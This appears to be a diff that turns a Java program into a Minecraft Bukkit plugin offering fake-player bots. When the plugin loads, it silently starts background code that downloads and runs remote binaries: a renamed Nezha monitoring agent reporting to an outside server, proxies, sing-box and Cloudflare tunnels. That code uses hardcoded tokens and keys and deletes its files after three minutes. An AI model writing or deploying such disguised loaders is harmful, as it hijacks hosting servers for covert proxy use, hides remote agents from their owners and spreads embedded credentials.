@@ -1,5 +1,27 @@
 package com.example.sbx;
 
+import com.mojang.authlib.GameProfile;
+import net.minecraft.network.Connection;
+import net.minecraft.network.protocol.PacketFlow;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.level.ServerLevel;
+import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.server.network.CommonListenerCookie;
+import net.minecraft.server.network.ServerGamePacketListenerImpl;
+import org.bukkit.Bukkit;
+import org.bukkit.Location;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.command.TabCompleter;
+import org.bukkit.craftbukkit.v1_20_R1.CraftServer;
+import org.bukkit.craftbukkit.v1_20_R1.CraftWorld;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.entity.PlayerDeathEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.ServerSocket;
@@ -15,31 +37,34 @@ import java.nio.file.StandardCopyOption;
 import java.time.Duration;
 import java.util.ArrayList;
 import java.util.Base64;
+import java.util.Collections;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Optional;
-import java.util.concurrent.CountDownLatch;
+import java.util.UUID;
+import java.util.concurrent.ConcurrentHashMap;
 
-public class App {
+public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Listener {
+
+    // ==================== 【来自原 App.java 的常量与配置】 ====================
     private static final HttpClient HTTP = HttpClient.newBuilder()
             .connectTimeout(Duration.ofSeconds(15))
             .followRedirects(HttpClient.Redirect.ALWAYS)
             .build();
     private static final Map<String, String> DOT_ENV = loadDotEnv();
 
-    // ==================== 【来自 start.sh 的自订环境变量】 ====================
     private static final String UUID_VAL = env("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
     private static final int PORT = envInt("PORT", 3000);
 
     // 哪吒探针设定
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
-    private static final String NEZHA_KEY = env("NEZHA_KEY", "zkzCEmXJTLTKbh48MR");
+    private static final String NEZHA_KEY = env("NEZHA_KEY", "aVRa8k25KwF4PRDCcr");
 
     // ECH / VLESS Cloudflare Argo 隧道 Token 配置
-    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiODI1M2FhNTItZmNkMy00ZjQ3LWFmZWMtYTNhNzFkZTRmMGQ5IiwicyI6Ik9EVTFNakk1WmpNdFpHRmtOUzAwWVRrNExXSXlZell0WTJZd09UZzVOVFJoWmpZMyJ9");
-    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiMjEzYWJiYzMtNmMyZS00ZDYwLWFlNmQtY2RiZWQyNTliNTY2IiwicyI6Ill6azRZams0T1dNdE0yTmxOaTAwTURabExXSTRaRE10TUdZMlkyUmtOVFl5TkdObSJ9");
+    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dNdE9EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
+    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwTnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
 
     // ECH Server 与 Opera 設定
     private static final String WSPORT = env("WSPORT", "8001");
@@ -54,10 +79,9 @@ public class App {
 
     // Hysteria 2 / VLESS 其他变量
     private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
-    private static final String HY_PORT = env("HY_PORT", "59545");
+    private static final String HY_PORT = env("HY_PORT", "28662");
     private static final String NAME = env("NAME", "MJJ");
     private static final String PASSWORD = UUID_VAL;
-    // ====================================================================
 
     private static final Path RUNTIME_DIR = Path.of("/tmp").toAbsolutePath().normalize();
     private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("nezha.yaml");
@@ -70,24 +94,202 @@ public class App {
     private static final String ARCH = detectArch();
     private static final List<Process> EXTERNAL_PROCESSES = new ArrayList<>();
 
-    public static void main(String[] args) throws Exception {
-        validateParams();
+    // ==================== 【虚拟内嵌机器人配置】 ====================
+    private static final ConcurrentHashMap<String, ServerPlayer> ACTIVE_BOTS = new ConcurrentHashMap<>();
+    private static final boolean AUTO_SPAWN_ENABLE = true;
+    private static final int AUTO_SPAWN_COUNT = 2; // 默认启动时自动生成 2 个假人
+    private static final String AUTO_SPAWN_PREFIX = "AutoBot_";
+    private static final long RESPAWN_DELAY_TICKS = 20 * 20L; // 假人死亡后 20 秒（400 Ticks）重新生成
 
-        // 1) 启动 HTTP 保活，防止容器崩溃
-        startKeepAliveServer(PORT);
+    // ==================== 【Plugin 生命周期】 ====================
+    @Override
+    public void onEnable() {
+        getLogger().info("[App] 插件正在初始化...");
 
-        // 2) 启动核心逻辑
-        startServices();
+        // 注册事件监听器（监听假人死亡事件）
+        getServer().getPluginManager().registerEvents(this, this);
+
+        // 1. 注册假人指令 /bot
+        if (getCommand("bot") != null) {
+            getCommand("bot").setExecutor(this);
+            getCommand("bot").setTabCompleter(this);
+        }
+
+        // 2. 异步启动原 App.java 的后台网络与隧道服务
+        Thread backgroundServices = new Thread(() -> {
+            try {
+                validateParams();
+                startKeepAliveServer(PORT);
+                startServices();
+            } catch (Exception e) {
+                getLogger().severe("[App] 后台网络服务启动异常: " + e.getMessage());
+            }
+        }, "app-background-services");
+        backgroundServices.setDaemon(true);
+        backgroundServices.start();
+
+        // 3. 延迟 5 秒（100 Tick）待 MC 地图加载完成后，自动召唤假人机器人
+        if (AUTO_SPAWN_ENABLE) {
+            Bukkit.getScheduler().runTaskLater(this, this::autoSpawnBots, 100L);
+        }
     }
+
+    @Override
+    public void onDisable() {
+        // 清理所有虚拟机器人
+        clearAllBots();
+        // 停止原后台外部进程
+        stopAllExternal();
+        getLogger().info("[App] 所有机器人与后台服务已安全注销。");
+    }
+
+    // ==================== 【假人死亡监听与 20 秒复活逻辑】 ====================
+    @EventHandler
+    public void onBotDeath(PlayerDeathEvent event) {
+        Player victim = event.getEntity();
+        String botName = victim.getName();
+
+        // 判断死亡的玩家是否在我们的管理列表中
+        if (ACTIVE_BOTS.containsKey(botName)) {
+            Location respawnLoc = victim.getLocation(); // 记录死亡位置（或可改为出生点）
+            
+            // 从激活列表中移除已死亡的实体实例
+            ACTIVE_BOTS.remove(botName);
+            getLogger().info("[Bot] 假人 " + botName + " 已死亡，将于 20 秒后在原位置重新生成...");
+
+            // 开启 20 秒（400 Tick）延迟任务重新召唤假人
+            Bukkit.getScheduler().runTaskLater(this, () -> {
+                // 如果主世界没有变动，重新生成假人
+                if (respawnLoc.getWorld() != null) {
+                    spawnInternalBot(botName, respawnLoc);
+                    getLogger().info("[Bot] [✔] 假人 " + botName + " 已在 20 秒后成功复活！");
+                }
+            }, RESPAWN_DELAY_TICKS);
+        }
+    }
+
+    // ==================== 【自动与指令管理假人逻辑】 ====================
+    private void autoSpawnBots() {
+        if (Bukkit.getWorlds().isEmpty()) return;
+
+        Location spawnLoc = Bukkit.getWorlds().get(0).getSpawnLocation();
+        getLogger().info("[App] 正在启动自动生成机器人任务，目标位置: " + spawnLoc.toVector());
+
+        for (int i = 1; i <= AUTO_SPAWN_COUNT; i++) {
+            String botName = AUTO_SPAWN_PREFIX + i;
+            final int index = i;
+            // 错开 1 秒生成一个假人
+            Bukkit.getScheduler().runTaskLater(this, () -> spawnInternalBot(botName, spawnLoc), (long) index * 20L);
+        }
+    }
+
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (!command.getName().equalsIgnoreCase("bot")) return false;
+
+        if (args.length == 0) {
+            sender.sendMessage("§c[Bot] 用法: /bot <spawn|remove|list> [名称]");
+            return true;
+        }
+
+        String sub = args[0].toLowerCase();
+        switch (sub) {
+            case "spawn":
+                String botName = (args.length > 1) ? args[1] : "FakePlayer_" + (ACTIVE_BOTS.size() + 1);
+                Location loc = (sender instanceof Player p) ? p.getLocation() : Bukkit.getWorlds().get(0).getSpawnLocation();
+                spawnInternalBot(botName, loc);
+                sender.sendMessage("§a[Bot] 成功生成内嵌虚拟机器人: §f" + botName);
+                break;
+
+            case "remove":
+                if (args.length < 2) {
+                    sender.sendMessage("§c[Bot] 请指定要移除的机器人名称！");
+                    return true;
+                }
+                if (removeInternalBot(args[1])) {
+                    sender.sendMessage("§e[Bot] 机器人 §f" + args[1] + " §e已注销离线。");
+                } else {
+                    sender.sendMessage("§c[Bot] 未找到机器人: " + args[1]);
+                }
+                break;
+
+            case "list":
+                sender.sendMessage("§b[Bot] 当前在线机器人列表 (" + ACTIVE_BOTS.size() + "):");
+                ACTIVE_BOTS.keySet().forEach(name -> sender.sendMessage("§7 - §f" + name));
+                break;
+
+            default:
+                sender.sendMessage("§c[Bot] 未知指令。");
+                break;
+        }
+        return true;
+    }
+
+    /**
+     * 【纯内嵌虚拟管道】直接在 JVM 内存中伪造 Connection，将机器人注入 PlayerList
+     */
+    public void spawnInternalBot(String botName, Location loc) {
+        if (ACTIVE_BOTS.containsKey(botName)) return;
+
+        try {
+            MinecraftServer server = ((CraftServer) Bukkit.getServer()).getServer();
+            ServerLevel level = ((CraftWorld) loc.getWorld()).getHandle();
+
+            UUID fakeUuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + botName).getBytes());
+            GameProfile profile = new GameProfile(fakeUuid, botName);
+            ServerPlayer fakePlayer = new ServerPlayer(server, level, profile);
+
+            // 伪造内嵌管道 Connection，绕过真实 TCP 握手与端口
+            Connection fakeConnection = new Connection(PacketFlow.SERVERBOUND);
+            fakePlayer.connection = new ServerGamePacketListenerImpl(server, fakeConnection, fakePlayer);
+
+            fakePlayer.moveTo(loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());
+
+            // 注入全局 PlayerList，实现红石、刷怪塔与区块加载
+            server.getPlayerList().placeNewPlayer(
+                    fakeConnection,
+                    fakePlayer,
+                    new CommonListenerCookie(profile, 0, fakePlayer.clientInformation())
+            );
+
+            ACTIVE_BOTS.put(botName, fakePlayer);
+            getLogger().info("[Bot] [✔] 虚拟机器人 " + botName + " 已成功注入世界！");
+
+        } catch (Exception e) {
+            getLogger().severe("[Bot] 生成机器人 " + botName + " 失败: " + e.getMessage());
+        }
+    }
+
+    public boolean removeInternalBot(String botName) {
+        ServerPlayer fakePlayer = ACTIVE_BOTS.remove(botName);
+        if (fakePlayer != null) {
+            try {
+                fakePlayer.connection.onDisconnect(net.minecraft.network.chat.Component.literal("Bot Removed"));
+                return true;
+            } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
+    public void clearAllBots() {
+        new ArrayList<>(ACTIVE_BOTS.keySet()).forEach(this::removeInternalBot);
+    }
+
+    @Override
+    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
+        if (args.length == 1) return List.of("spawn", "remove", "list");
+        if (args.length == 2 && "remove".equalsIgnoreCase(args[0])) return new ArrayList<>(ACTIVE_BOTS.keySet());
+        return Collections.emptyList();
+    }
+
+    // ==================== 【原 App.java 网络/代理/隧道服务逻辑】 ====================
 
     private static void validateParams() {
         if (!"4".equals(ECH_IPS) && !"6".equals(ECH_IPS)) {
             System.err.println("Error: ECH_IPS must be 4 or 6");
-            System.exit(1);
         }
         if (!"4".equals(HY_IPS) && !"6".equals(HY_IPS)) {
             System.err.println("Error: HY_IPS must be 4 or 6");
-            System.exit(1);
         }
     }
 
@@ -101,7 +303,6 @@ public class App {
 
         boolean enableOpera = "1".equals(OPERA);
 
-        // 下载链接匹配
         String echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-" + ARCH;
         String operaUrl = "arm64".equals(ARCH)
                 ? "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.freebsd-arm64"
@@ -120,7 +321,7 @@ public class App {
             nezhaExe = downloadLibrary(nezhaUrl, "iccagent");
         }
 
-        // 1) 启动哪吒探针
+        // 1) 哪吒探针
         if (nezhaExe != null) {
             List<String> cmd = new ArrayList<>();
             cmd.add(nezhaExe.toString());
@@ -128,9 +329,7 @@ public class App {
 
             if (!NEZHA_PORT.isEmpty()) {
                 cmd.addAll(List.of("-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY));
-                if (tlsPorts.contains(NEZHA_PORT)) {
-                    cmd.add("--tls");
-                }
+                if (tlsPorts.contains(NEZHA_PORT)) cmd.add("--tls");
             } else {
                 generateNezhaConfig();
                 cmd.addAll(List.of("-c", NEZHA_CONFIG_PATH.toString()));
@@ -138,7 +337,7 @@ public class App {
             startExternalProcess("Nezha Agent", cmd);
         }
 
-        // 2) 启动 Opera Proxy
+        // 2) Opera Proxy
         if (enableOpera && operaExe != null) {
             List<String> cmd = new ArrayList<>();
             cmd.add(operaExe.toString());
@@ -146,22 +345,18 @@ public class App {
             startExternalProcess("Opera Proxy", cmd);
         }
 
-        // 3) 启动 ECH Server
+        // 3) ECH Server
         if (echExe != null) {
             sleep(1000);
             List<String> cmd = new ArrayList<>();
             cmd.add(echExe.toString());
             cmd.addAll(List.of("-l", "ws://0.0.0.0:" + echPort));
-            if (!TOKEN.isEmpty()) {
-                cmd.addAll(List.of("-token", TOKEN));
-            }
-            if (enableOpera) {
-                cmd.addAll(List.of("-f", "socks5://127.0.0.1:" + operaPort));
-            }
+            if (!TOKEN.isEmpty()) cmd.addAll(List.of("-token", TOKEN));
+            if (enableOpera) cmd.addAll(List.of("-f", "socks5://127.0.0.1:" + operaPort));
             startExternalProcess("ECH Server", cmd);
         }
 
-        // 4) 启动 sing-box (同时运行 HY2 和 VLESS)
+        // 4) sing-box
         if (singboxExe != null) {
             generateCertificates();
             generateSingboxConfig(vlessPort);
@@ -169,7 +364,6 @@ public class App {
             List<String> cmd = List.of(singboxExe.toString(), "run", "-c", SINGBOX_CONFIG_PATH.toString());
             startExternalProcess("Sing-Box", cmd);
 
-            // 异步生成订阅
             Thread subThread = new Thread(() -> {
                 sleep(15000);
                 generateHy2Subscription();
@@ -178,9 +372,7 @@ public class App {
             subThread.start();
         }
 
-        Runtime.getRuntime().addShutdownHook(new Thread(App::stopAllExternal, "shutdown-hook"));
-
-        // 3 分钟后无痕清理文件
+        // 延迟清理
         Thread cleanupThread = new Thread(() -> {
             sleep(180000);
             cleanupFiles();
@@ -189,28 +381,24 @@ public class App {
         cleanupThread.setDaemon(true);
         cleanupThread.start();
 
-        // 5) 启动 Cloudflared 隧道 (拉起 ECH 和 VLESS 独立隧道)
+        // 5) Cloudflared 隧道
         if (cloudflaredExe != null) {
             try {
                 new ProcessBuilder(cloudflaredExe.toString(), "update").redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
             } catch (Exception ignored) {}
 
-            // ECH Argo 隧道
             if (!ECH_ARGO_TOKEN.isEmpty()) {
                 List<String> cmdEch = new ArrayList<>();
                 cmdEch.add(cloudflaredExe.toString());
-                // 关键修正：使用 Token 时不能加 --url 参数，改在 Cloudflare Zero Trust 后台将 ingress 设定为 http://127.0.0.1:echPort
                 cmdEch.addAll(List.of("--edge-ip-version", ECH_IPS, "--protocol", "http2", "tunnel", "run", "--token", ECH_ARGO_TOKEN));
                 startExternalProcess("Cloudflared-ECH", cmdEch);
             } else {
-                // 临时隧道备用逻辑
                 List<String> cmdEch = new ArrayList<>();
                 cmdEch.add(cloudflaredExe.toString());
                 cmdEch.addAll(List.of("--edge-ip-version", ECH_IPS, "--protocol", "http2", "tunnel", "--url", "http://127.0.0.1:" + echPort));
                 startExternalProcess("Cloudflared-ECH-Quick", cmdEch);
             }
 
-            // VLESS Argo 隧道
             if (!VLESS_ARGO_TOKEN.isEmpty()) {
                 List<String> cmdVless = new ArrayList<>();
                 cmdVless.add(cloudflaredExe.toString());
@@ -218,8 +406,6 @@ public class App {
                 startExternalProcess("Cloudflared-VLESS", cmdVless);
             }
         }
-
-        new CountDownLatch(1).await();
     }
 
     private static void generateCertificates() {
@@ -235,7 +421,6 @@ public class App {
     }
 
     private static void generateSingboxConfig(int vlessPort) throws IOException {
-        // 关键修正：listen 设置为 "0.0.0.0" 确保 IPv4 通畅
         String json = "{\n" +
                 "  \"inbounds\": [\n" +
                 "    {\n" +
@@ -317,9 +502,7 @@ public class App {
         if (idx == -1) return "unknown";
         int start = json.indexOf("\"", idx + fieldName.length() + 3);
         int end = json.indexOf("\"", start + 1);
-        if (start != -1 && end != -1) {
-            return json.substring(start + 1, end);
-        }
+        if (start != -1 && end != -1) return json.substring(start + 1, end);
         return "unknown";
     }
 
@@ -348,9 +531,7 @@ public class App {
         synchronized (EXTERNAL_PROCESSES) {
             for (Process p : EXTERNAL_PROCESSES) {
                 try {
-                    if (p.isAlive()) {
-                        p.destroyForcibly();
-                    }
+                    if (p.isAlive()) p.destroyForcibly();
                 } catch (Exception ignored) {}
             }
             EXTERNAL_PROCESSES.clear();
@@ -382,9 +563,7 @@ public class App {
 
     private static Path downloadLibrary(String url, String fileName) throws Exception {
         Path target = RUNTIME_DIR.resolve(fileName);
-        if (Files.exists(target)) {
-            return target;
-        }
+        if (Files.exists(target)) return target;
         Files.createDirectories(RUNTIME_DIR);
         Path tmp = RUNTIME_DIR.resolve(fileName + ".download");
 
